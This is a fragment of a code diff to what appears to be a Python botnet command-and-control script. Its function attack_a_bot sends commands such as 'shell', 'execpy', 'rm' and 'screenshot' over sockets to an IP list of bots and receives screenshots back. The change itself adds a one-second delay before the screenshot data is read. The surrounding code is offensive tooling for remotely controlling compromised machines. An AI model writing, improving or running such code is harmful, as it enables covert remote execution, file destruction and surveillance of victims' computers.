@@ -1,4 +1,4 @@
-import socket, platform, os, ipaddress
+import socket, platform, os, ipaddress, time
 #SCREENSHOTTER
 answerable_cmdlets = ["cat", "selftest", "ls", "screenshot"]
 onearg_cmdlets = ["cat", "shell", "talk", "execpy", "mkdir", "rmdir", "rm", "ls"]
@@ -55,6 +55,7 @@ def attack_a_bot(botnet_exemplars_ipv4, commandlet):
             sock.send(firstarg.encode("utf-8"))
         if commandlet == "screenshot":
             print("Receiving...")
+            time.sleep(1)
             ldata = int(sock.recv(16384).decode("utf-8"))
             print(f"{ldata} received")
             data = sock.recv(ldata)
